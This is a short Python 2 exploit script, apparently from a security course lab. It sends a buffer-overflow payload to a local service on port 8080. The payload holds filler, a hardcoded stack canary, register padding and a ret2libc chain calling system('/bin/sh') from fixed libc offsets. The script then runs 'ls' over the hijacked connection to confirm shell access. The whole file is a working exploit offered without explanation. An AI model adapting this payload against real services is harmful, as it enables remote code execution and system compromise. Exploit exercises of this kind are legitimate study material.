import socket
import struct
import time

ebx = "\xCC"*4
edi = "I"*4
ebp = "P"*4

exit_flag = "\x01\x01\x01\x01"
canaries = "\xBF\xA4\xA8\xA6"
eip = "\xC9\x99\x04\x08"
libc_base = int("0xb759e000",16)

print "libc_base: ",hex(libc_base)
system = libc_base + 0x0003ab40
exit = libc_base + 0x0002e7f0
binsh_string = libc_base + 0x15cdc8

print "System: ",system
print "Exit: ",exit
print "Binsh: ",binsh_string

rop = struct.pack('<L',system)
rop += struct.pack('<L',exit)
rop += struct.pack('<L', binsh_string)

# print rop
buffer = "A"*128+canaries+exit_flag+"S"*4+ebx+edi+ebp+rop

# connection setup
TCP_IP = '127.0.0.1'
TCP_PORT = 8080
BufferSize = 2048

# open connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

# send login, update username + pattern
s.send('cs19m018:cs19m018'+'\n')
data = s.recv(BufferSize)
time.sleep(1)
s.send('u '+ buffer + '\n')
data = s.recv(BufferSize)

# show cli command output
s.send('ls'+'\n')
data = s.recv(BufferSize)
print "received data:", data
s.close()